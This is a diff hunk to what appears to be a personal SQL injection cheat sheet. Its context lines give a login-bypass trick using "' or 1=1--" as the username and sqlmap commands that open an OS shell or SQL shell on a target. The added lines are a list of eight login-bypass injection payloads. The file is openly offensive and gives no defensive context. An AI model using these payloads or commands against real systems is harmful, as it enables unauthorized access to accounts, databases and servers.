@@ -5,3 +5,11 @@ in login page enter blah' or 1=1-- as username and click login without entering 
 
 OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
 SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
